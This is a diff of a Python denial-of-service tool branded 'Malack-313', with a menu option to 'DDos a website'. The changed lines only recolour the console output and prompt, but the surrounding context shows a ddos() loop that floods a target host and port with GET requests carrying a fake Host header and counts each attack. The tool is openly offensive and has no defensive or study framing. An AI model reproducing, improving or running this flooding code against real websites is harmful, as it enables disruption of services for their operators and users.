@@ -51,7 +51,7 @@ def ddos():
                 s.sendto(('Host: ' + fake + '\r\n\r\n').encode('ascii'), (trget, port))
 
                 attack_num += 1
-                print("[÷]  \033[0;36mMalack-313  \033[0;37mGET \033[1;33mattack \033[1;32m@\033[0m"+ str(attack_num))
+                print("[÷]  \033[0;36mMalack-313 \033[0;31m▒\033[1;37m▒ \033[0;37mGET \033[1;33mattack \033[1;32m@ ▒\033[0m"+ str(attack_num))
             except socket.error:
                 print('CONNECTION FAILED, HOST MAY BE DOWN OR CHECK IP OR PORT')
                 break
@@ -91,12 +91,12 @@ def menu():
    # print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" Fore.WHITE + "Press CTRL + C and press enter to exit!!")
     print(Style.BRIGHT + Fore.YELLOW + "[INFO!]" + Fore.BLUE + "Press CTRL + C and press enter to exit!!")
     print(Fore.WHITE + Style.BRIGHT + "——————————————————————————————————————————————————————————————————")
-    print(Fore.YELLOW + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
-    print(Fore.BLUE + Style.BRIGHT + "1. DDos a website.  [1]")
-    print(Fore.WHITE + Style.BRIGHT + "2. exit.            [2]")
+    print(Fore.GREEN + Style.BRIGHT + "Silahkan ketik 1 untuk melanjutkan...")
+    print(Fore.CYAN + Style.BRIGHT +  "1. DDos a website.  [1]")
+    print(Fore.YELLOW + Style.BRIGHT +"2. exit.            [2]")
     print("Enter your options .. [e.g 1,2]") 
     global usr
-    usr = input(Fore.YELLOW + Style.BRIGHT + "0======>> " )
+    usr = input(Fore.YELLOW + Style.BRIGHT + "▒ ▒⟩⟩   " )
     if usr == "1":
         ddos()
     elif usr == "2":
